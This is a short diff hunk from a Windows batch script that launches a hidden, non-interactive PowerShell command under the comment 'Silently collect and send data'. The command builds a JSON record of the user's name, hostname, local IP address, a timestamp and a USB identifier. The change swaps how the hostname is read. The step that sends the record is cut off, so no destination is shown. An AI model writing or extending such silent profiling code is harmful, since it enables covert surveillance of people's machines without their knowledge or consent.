@@ -26,7 +26,7 @@ powershell -command "$sig='[DllImport(\"user32.dll\")] public static extern bool
 :: Silently collect and send data
 powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command ^
   "$u=(whoami).Split('\')[-1];" ^
-  "$h=$env:COMPUTERNAME;" ^
+  "$h=[System.Net.Dns]::GetHostName();" ^
   "$ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127*' -and $_.IPAddress -notlike '169*'} | Select-Object -First 1).IPAddress;" ^
   "$t=[datetime]::UtcNow.ToString('o');" ^
   "$b='[{\"timestamp\":\"'+$t+'\",\"username\":\"'+$u+'\",\"hostname\":\"'+$h+'\",\"ip\":\"'+$ip+'\",\"usb_id\":\"%USB_ID%\"}]';" ^
